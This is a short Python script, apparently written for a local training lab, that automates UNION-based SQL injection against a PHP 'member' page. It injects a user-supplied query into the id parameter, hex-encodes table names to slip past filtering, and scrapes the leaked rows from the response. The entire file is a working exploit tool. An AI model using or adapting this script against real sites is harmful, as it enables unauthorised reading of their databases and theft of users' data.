#!/usr/bin/env python3

import requests
import urllib.parse
import sys

query = sys.argv[1]
if len(sys.argv) == 3:
    table_name = sys.argv[2]
    print("table_name:", table_name)
    table_name_hex = ""
    for c in table_name:
        table_name_hex += hex(ord(c))[2:]
    table_name_hex = "0x" + table_name_hex
    query += " " + table_name_hex
print(query)
query = bytes(query,encoding="ascii")
try:
    send = urllib.parse.quote_plus(query)
except Exception as e:
    print(e)

link = "http://localhost:10080/index.php?page=member&id=1+union+all+select+1%2C"+send+"&Submit=Submit#"
f = requests.get(link)

# print (f.text)
from bs4 import BeautifulSoup

soup = BeautifulSoup(f.text, "html.parser")

# x = soup.body.find('pre', attrs={'class' : 'container'}).text
x = soup.find_all('pre')
# x.pop(0)
# print(x)
if len(x) == 1:
    print(x[0])
else:
    x.pop(0)
    for line in x:
        line = str(line)
        to_print = line[line.find("Surname :") + 10:line.find("</pre>")]
        print (to_print)
print("----------------------------------------------------------------------------------------------------")
